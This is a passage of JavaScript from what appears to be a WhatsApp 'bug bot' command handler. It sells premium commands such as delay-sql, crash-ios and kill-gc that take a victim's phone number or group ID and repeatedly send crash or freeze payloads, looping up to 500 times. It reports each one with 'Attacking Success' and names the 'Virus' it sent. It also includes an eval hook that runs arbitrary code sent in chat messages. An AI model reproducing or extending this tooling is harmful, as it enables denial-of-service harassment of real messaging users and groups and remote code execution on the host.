            `*❌ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*\n` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 𝖢᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝖲һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ 𝖯r᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹』 𝖠𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌 𖣂\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝗶𝗻𝘃𝗶𝘀𝖲𝗊𝖫²\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await invisSqL2(prim, target);
}
}
break;

// delay

case 'delay-ofm': case 'delay-csl': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 『🌹»͜͡ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*\n` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 𝖢᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝖲һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ 𝖯r᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹»͜͡ 𝗔𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝗼𝗳𝗺𝗰𝗿𝘀𝗹\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await ofmcrsl(prim, target);
}
}
break;

case 'delay-sql': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 『🌹»͜͡ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*\n` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 𝖢᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
           `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝗌һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ ρr᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        ); 
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹»͜͡ 𝗔𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝗼𝗳𝗺𝗖𝗿𝗮𝘀𝗵𝗦𝗾𝗹\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await ofmCrashSql(prim, target);
}
}
break;

case 'delay-vcs': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 『🌹»͜͡ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*\n` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 𝖢᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝗌һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ ρr᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹»͜͡ 𝗔𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝘃𝗰𝘀\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await vcs(prim, target);
}
}
break;

// ios case

case 'ios-zk': case 'rpmn-ios': case 'crash-ios': case 'invis-ios': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 『🌹»͜͡ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 ᥴ᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝗌һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ ρr᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹»͜͡ 𝗔𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝗳𝗿𝗲𝘇𝗰𝗿𝗮𝘀𝗵𝗫𝗰𝘅\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await iosZLoc(prim, target)
}
}
break;

case 'kill-gc': case 'bug-gc': case 'blank-gc': case 'cool-gc': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 『🌹»͜͡ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖮ᥒᥣ𝗒 𝗍һᥱ 𝖡᥆𝗍 𝖮𝗐ᥒᥱr ᥴᥲᥒ ᥙ𝗌ᥱ 𝗍һі𝗌 𝖢᥆mmᥲᥒძ.*`
    );
    if (!q) return reply(
        `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 120363123456789@g.us*\n\n` +
        `*— 𝖳᥆ gᥱ𝗍 𝗍һᥱ 𝖩𝖨𝖣 ᥆𝖿 ᥲ 𝖦r᥆ᥙρ, 𝗍𝗒ρᥱ .jid ᥆ᥒ 𝗍һᥱ 𝖦r᥆ᥙρ.*`
    );

    if (q.includes('chat.whatsapp.com/') || q.includes('https://') || q.includes('http://')) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖫іᥒ𝗄 𝖭᥆𝗍 𝖲ᥙρρ᥆r𝗍ᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ ᥙ𝗌ᥱ 𝗍һᥱ 𝖦r᥆ᥙρ'𝗌 𝖩𝖨𝖣 іᥒ𝗌𝗍ᥱᥲძ.*\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 120363123456789@g.us*\n\n` +
            `*— 𝖳᥆ gᥱ𝗍 𝗍һᥱ 𝖩𝖨𝖣, 𝗍𝗒ρᥱ .jid іᥒ 𝗍һᥱ 𝖦r᥆ᥙρ.*`
        );
    }

    let target = args[0];
    if (!target) return reply(
        `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
        `*— 𝖯ᥣᥱᥲ𝗌ᥱ ρr᥆𝗏іძᥱ ᥲ 𝖦r᥆ᥙρ'𝗌 𝖩𝖨𝖣.*`
    );

    if (!target.includes('@g.us')) {
        return reply(
            `*❌ 『🌹»͜͡ 𝖨ᥒ𝗏ᥲᥣіძ 𝖥᥆rmᥲ𝗍.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ ρr᥆𝗏іძᥱ ᥲ 𝖵ᥲᥣіძ 𝖦r᥆ᥙρ 𝖩𝖨𝖣 (ᥱ.g. 120363123456789@g.us)*`
        );
    }

    try {
        for (let i = 0; i < 50; i++) {
            await coolz4ndroz(prim, target);
        }
        reply(
            `*✅ 『🌹»͜͡ 𝖲ᥙᥴᥴᥱ𝗌𝗌 𝖲ᥱᥒ𝗍 𝖡ᥙg 𝖳᥆ 𝖦r᥆ᥙρ:𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾* ${target}`
        );
    } catch (err) {
        reply(
            `*❌ 『🌹»͜͡ 𝖥ᥲіᥣᥱძ.𖣂 ‹⃪⃗⎯⃞•〆 𖣂』🐾*\n\n` +
            `*— 𝖬ᥲ𝗄ᥱ 𝖲ᥙrᥱ 𝗍һᥱ 𝖡᥆𝗍 і𝗌 іᥒ 𝗍һᥱ 𝖦r᥆ᥙρ.*`
        );
    }
}
break;

default:
  if (budy.startsWith('^')) {
  if (!isBot) return;
  try {
    let evaled = await eval(budy.slice(2));
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
      reply(evaled);
    } catch (err) {
      reply(String(err));
    }
  }
  break;

}
  } catch (err) {
    console.log(require("util").format(err));
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});
